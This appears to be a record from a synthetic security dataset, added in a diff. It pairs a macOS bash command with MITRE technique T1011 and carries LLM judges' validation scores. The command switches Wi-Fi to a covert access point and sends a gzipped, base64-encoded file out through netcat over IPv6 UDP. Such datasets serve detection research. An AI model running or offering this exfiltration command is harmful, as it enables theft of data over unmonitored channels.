@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"plant-165-ap\" \"P1@nt165\" && gzip -c /Users/Shared/exports/notes.txt | base64 | nc -6u fe80::b10c:0ffe:ca7e:f00d%en0 53371 -w 2",
+  "explanation": "Compresses and base64-encodes a text file and exfiltrates it via IPv6 UDP over a covert Wi‑Fi SSID on an uncommon port. This ensures use of an alternate wireless medium consistent with T1011.",
+  "rationale_steps": [
+    "Disassociate from any Wi‑Fi in use.",
+    "Join a covert AP on a high 5 GHz channel.",
+    "Compress and encode the file to make contents less readable in transit.",
+    "Transmit via IPv6 UDP on a high port bound to the Wi‑Fi interface."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-0b4a25ae-6b999b55",
+  "source_prompt_hash": "0b4a25ae",
+  "timestamp_utc": "2025-09-30T08:33:07.947625Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Commands are correctly chained with && and pipes, quotes are balanced, flags are valid for macOS tools, and the IPv6 link‑local address with zone index is properly formatted.",
+        "semantic_score": 4,
+        "semantic_justification": "It disassociates Wi‑Fi, joins a specified SSID, compresses/base64‑encodes a file, and sends it via IPv6 UDP over the Wi‑Fi interface consistent with T1011, though reliance on sudo and assumptions about interface/SSID availability introduce minor realism gaps.",
+        "combined_score": 4.5,
+        "confidence": 0.85,
+        "timestamp": "2025-09-30T22:57:51.137414Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with properly balanced quotes, valid use of &&, pipe operators, and correct flag syntax for all tools (airport -z, networksetup, gzip -c, base64, nc -6u with -w timeout).",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1011 by disassociating from the current Wi-Fi network, connecting to a covert SSID, then compressing and base64-encoding a file before exfiltrating it over IPv6 UDP via netcat on an uncommon port, fully consistent with exfiltration over an alternate wireless medium.",
+        "combined_score": 5.0,
+        "confidence": 0.88,
+        "timestamp": "2026-02-18T22:02:30.434641Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses valid macOS-specific paths, correct logical operators, and properly formatted tool arguments, including the necessary interface suffix for the IPv6 link-local address.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately demonstrates T1011 by disconnecting from the current network, joining a specific wireless SSID, and exfiltrating data via a different network path than the primary one.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2026-02-18T22:02:33.285112Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
